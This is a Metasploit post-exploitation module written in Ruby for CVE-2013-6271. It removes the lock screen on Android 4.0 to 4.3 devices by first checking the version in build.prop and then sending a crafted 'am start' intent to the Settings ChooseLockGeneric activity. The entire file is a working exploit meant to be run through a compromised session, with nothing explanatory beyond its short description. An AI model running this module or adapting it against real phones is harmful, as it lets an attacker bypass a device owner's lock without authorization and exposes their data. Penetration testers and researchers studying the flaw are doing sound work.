##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Post
  Rank = NormalRanking

  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "Android Settings Remove Device Locks",
        'Description'   => %q{
            This module exploits a bug in the Android 4.0 to 4.3 com.android.settings.ChooseLockGeneric class.
            Any unprivileged app can exploit this vulnerability to remove the lockscreen.
            A logic flaw / design error exists in the settings application that allows an Intent from any
            application to clear the screen lock. The user may see that the Settings application has crashed,
            and the phone can then be unlocked by a swipe.
            This vulnerability was patched in Android 4.4.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
            'CureSec', # discovery
            'timwr'    # metasploit module
        ],
        'References'    =>
        [
            [ 'CVE', '2013-6271' ],
            [ 'URL', 'http://blog.curesec.com/article/blog/26.html' ],
            [ 'URL', 'http://www.curesec.com/data/advisories/Curesec-2013-1011.pdf' ]
        ],
        'SessionTypes'  => [ 'meterpreter', 'shell' ],
        'Platform'       => 'android',
        'DisclosureDate' => "Oct 11 2013"
      }
    ))
  end

  def run
    buildprop = cmd_exec('cat /system/build.prop')

    if buildprop.blank?
      print_error("Blank build.prop, try again")
      return
    end

    unless buildprop =~ /ro.build.version.release=4.[0|1|2|3]/
      print_error("This module is only compatible with Android versions 4.0 to 4.3")
      return
    end

    output = cmd_exec('am start -n com.android.settings/com.android.settings.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task')
    if output =~ /Error:/
      print_error("The Intent could not be started")
      vprint_status("Command output: #{output}")
    else
      print_good("Intent started, the lock screen should now be a dud.")
      print_good("Go ahead and manually swipe or provide any pin/password/pattern to continue.")
    end
  end

end

